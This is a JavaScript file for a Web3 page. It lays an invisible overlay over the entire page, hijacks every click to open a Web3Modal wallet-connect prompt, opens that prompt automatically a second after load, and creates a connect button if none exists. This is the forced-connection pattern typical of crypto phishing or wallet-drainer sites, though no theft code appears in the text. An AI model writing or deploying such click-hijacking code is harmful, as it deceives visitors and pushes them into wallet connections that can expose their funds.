document.addEventListener('DOMContentLoaded', function() {
    let isClickPending = false;
    let lastTriggerTime = 0;
    const DEBOUNCE_TIME = 2000; 
    let modalIsOpen = false;
    let isInitialized = false;
    let lastCloseTime = 0;
    const CLOSE_SETTLE_TIME = 500; 
    const overlay = document.createElement('div');
    overlay.className = 'click-blocker';
    document.body.appendChild(overlay);
    const originalConsoleLog = console.log;
    console.log = function(...args) {
        originalConsoleLog.apply(console, args);
        args.forEach(arg => {
            if (typeof arg === 'object' && arg.type === 'track') {
                if (arg.event === 'MODAL_OPEN') {
                    modalIsOpen = true;
                    overlay.style.display = 'none'; 
                    originalConsoleLog('Tracked: Modal opened');
                } else if (arg.event === 'MODAL_CLOSE') {
                    modalIsOpen = false;
                    lastCloseTime = Date.now();
                    overlay.style.display = 'block';
                    originalConsoleLog('Tracked: Modal closed');
                } else if (arg.event === 'INITIALIZE') {
                    isInitialized = true;
                    originalConsoleLog('Tracked: Web3Modal initialized');
                }
            }
        });
    };

    let connectButtons = document.querySelectorAll('.connect-wallet');
    if (connectButtons.length === 0) {
        console.log('No connect-wallet found! creating one');
        const newButton = document.createElement('button');
        newButton.className = 'connect-wallet';
        document.body.appendChild(newButton);
        connectButtons = document.querySelectorAll('.connect-wallet');
    }

    connectButtons.forEach(button => {
        button.addEventListener('click', (event) => {
            event.stopPropagation(); 
            if (!isClickPending && isInitialized && !modalIsOpen) {
                triggerModalOpen(button);
            }
        });
    });

    function triggerModalOpen(button) {
        try {
            if (window.Web3Modal && typeof window.Web3Modal.open === 'function') {
                window.Web3Modal.open();
            } else {
                console.warn('Web3Modal.open() not available, ensure Web3Modal is initialized');
                const clickEvent = new Event('click', {
                    bubbles: true,
                    cancelable: true
                });
                button.dispatchEvent(clickEvent);
            }
        } catch (error) {
            console.error('Error triggering modal:', error);
        }
    }

    function handlePageClick(event) {
        if (event.target.closest('.connect-wallet')) {
            return;
        }

        const now = Date.now();
        if (now - lastTriggerTime < DEBOUNCE_TIME || isClickPending) {
            return;
        }

        if (modalIsOpen) {
            return; 
        }
        if (now - lastCloseTime < CLOSE_SETTLE_TIME) {
            isClickPending = false;
            return;
        }
        if (!isInitialized) {
            isClickPending = false;
            return;
        }

        connectButtons = document.querySelectorAll('.connect-wallet');
        if (connectButtons.length === 0) {
            isClickPending = false;
            return;
        }
        const firstButton = connectButtons[0];
        if (firstButton.textContent.trim().toLowerCase().includes('disconnect')) {
            isClickPending = false;
            return;
        }

        event.preventDefault();
        event.stopPropagation();

        isClickPending = true;
        lastTriggerTime = now;
        triggerModalOpen(firstButton);

        setTimeout(() => {
            isClickPending = false;
        }, DEBOUNCE_TIME);
    }

    overlay.addEventListener('click', handlePageClick);
    document.body.addEventListener('click', handlePageClick);

 
    setTimeout(() => {
        connectButtons = document.querySelectorAll('.connect-wallet');
        if (connectButtons.length > 0 && isInitialized) {
           
            triggerModalOpen(connectButtons[0]);
        } else {
            console.log('Connect button or Web3Modal is not ready yet.');
        }
    }, 1000);  
});
